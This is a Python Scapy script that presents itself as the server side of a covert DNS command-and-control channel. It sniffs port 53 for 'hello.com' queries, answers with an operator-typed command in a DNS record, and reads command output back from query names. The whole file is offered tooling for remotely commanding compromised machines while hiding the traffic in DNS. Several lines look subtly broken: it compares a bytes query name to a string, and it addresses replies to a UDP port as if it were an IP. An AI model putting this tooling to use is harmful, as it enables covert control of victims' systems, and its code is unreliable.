"""
DNS C2 Server Script (Scapy-based)

- Listens for incoming DNS queries with qname 'hello.com'.
- When such a query is received, responds with a user-defined command in the DNS answer.
- Awaits a DNS reply (query name) containing command execution output from the client.

Used as part of a covert command-and-control (C2) channel over DNS.
"""

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

""" DNS server IP and port """
dns_port = 53
command_g = ""

def handle_reply(pkt):
    """ print output """
    print(pkt[DNSQR].qname.decode())

def handle_dns_request(pkt):
    """ Build and send DNS response """
    print("handling packet")
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt[DNSQR].qname == "hello.com":
        dns_response = (
                IP(dst=pkt[UDP].src) /
                UDP(dport=pkt[UDP].sport, sport=dns_port) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=command_g)
                )
        )
        send(dns_response)
        print(f"Sent DNS response : {dns_response}")
        """ Check for DNS/CMD reply """
        sniff(filter=f"udp port {dns_port}", prn=handle_reply)
    else:
        print("not the right dns packet")

def main():
    print("Starting DNS server...")
    """ Check for DNS/CMD query """
    global command_g
    command_g = input("Enter command to send to the server or 'exit': ")
    if command_g.lower() == "exit":
        exit()

    while True:
        sniff(filter=f"udp port {dns_port}", prn=handle_dns_request)


if __name__ == "__main__":
    main()
